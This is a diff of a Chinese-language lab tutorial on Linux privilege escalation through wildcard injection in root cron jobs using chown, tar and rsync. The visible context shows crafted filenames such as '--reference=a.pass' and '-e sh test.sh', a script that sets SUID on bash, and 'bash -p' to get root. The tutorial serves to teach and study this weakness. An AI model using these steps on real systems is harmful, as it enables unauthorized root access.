@@ -2,6 +2,7 @@
 title: "Linux提权-通配符提权"
 date: 2025-12-11T00:00:00+08:00
 draft: false
+
 ---
 
 # Linux提权-通配符提权
@@ -35,7 +36,7 @@ echo "Admin123456" > root.pass
 chmod 400 root.pass
 ~~~
 
-![image-20240924105355224](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240924105356918-1087568988.png)
+![image-20240924105355224](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240924105356918-1087568988.png)
 
 创建一个定时任务，原本目的为每分钟将`/tmp/pass`目录下的.pass文件所有者更改为root：
 
@@ -45,7 +46,7 @@ chmod 400 root.pass
 
 (由于是使用root权限设置的crontab，所以这里可以不注明root)
 
-![image-20240925224100059](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240925224102394-1250089020.png)
+![image-20240925224100059](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240925224102394-1250089020.png)
 
 环境配置完毕，切换用户到yuy0ung，开始利用
 
@@ -53,11 +54,11 @@ chmod 400 root.pass
 
 信息收集发现存在一个以root权限使用chown更改文件所有者的定时任务，且不规范的使用了通配符`*`
 
-![image-20240925223746089](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240925223748726-1094626186.png)
+![image-20240925223746089](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240925223748726-1094626186.png)
 
 根据内容发现`/tmp/pass/`目录下有个root.pass的密码文件，但没有权限读取：
 
-![image-20240924110841359](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240924110842487-675688650.png)
+![image-20240924110841359](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240924110842487-675688650.png)
 
 这里可以尝试利用上面定时任务中不规范的命令
 
@@ -71,11 +72,11 @@ echo > a.pass&&echo >--reference=a.pass
 
 等待定时任务执行发现root.pass的所有者变成了yuy0ung：
 
-![image-20240924113554673](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240924113556320-662327273.png)
+![image-20240924113554673](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240924113556320-662327273.png)
 
 接下来即可直接读取root.pass文件：
 
-![image-20240924113642142](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240924113643513-242882547.png)
+![image-20240924113642142](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240924113643513-242882547.png)
 
 ### tar+通配符注入提权
 
@@ -94,7 +95,7 @@ tar是linux中常用的文件归档工具
 
 #### 场景复现
 
-这个场景在云尘靶场的**linux提权系列-3**中考察了，这里直接给出我的wp作为参考：[云尘靶场-Linux提权系列WP](https://bbs.zkaq.cn/t/31898.html)
+这个场景在云尘靶场的**linux提权系列-3**中考察了，这里直接给出我的wp作为参考：[云尘靶场-Linux提权系列WP](https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E4%BA%91%E5%B0%98%E9%9D%B6%E5%9C%BA-linux%E6%8F%90%E6%9D%83%E7%B3%BB%E5%88%97/)
 
 ### rsync+通配符注入提权
 
@@ -110,7 +111,7 @@ root身份创建一个`/tmp/bak`
 
 写一个定时任务：
 
-![image-20240927222256717](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240927222257416-113972949.png)
+![image-20240927222256717](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240927222257416-113972949.png)
 
 切换到yuy0ung，开始复现
 
@@ -123,7 +124,7 @@ echo 'chmod 4777 /usr/bin/bash' > test.sh
 # 给bash赋予suid权限，为提权做准备
 ~~~
 
-![image-20240927223520957](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240927223521539-1454084710.png)
+![image-20240927223520957](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240927223521539-1454084710.png)
 
 再创建一个用于注入通配符的文件：
 
@@ -132,11 +133,11 @@ echo > '-e sh test.sh'
 # -e 为指定要运行的shell
 ~~~
 
-![image-20240927224159421](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240927224200370-1870655255.png)
+![image-20240927224159421](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240927224200370-1870655255.png)
 
 等待定时任务触发test.sh文件内容，给bash赋予suid权限：
 
-![image-20240927224336901](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240927224337247-360825789.png)
+![image-20240927224336901](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240927224337247-360825789.png)
 
 OK了，直接提权即可：
 
@@ -144,6 +145,6 @@ OK了，直接提权即可：
 bash -p
 ~~~
 
-![image-20240927225115198](https://img2023.cnblogs.com/blog/3450279/202409/3450279-20240927225115763-668394798.png)
+![image-20240927225115198](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240927225115763-668394798.png)
 
 拿下root权限
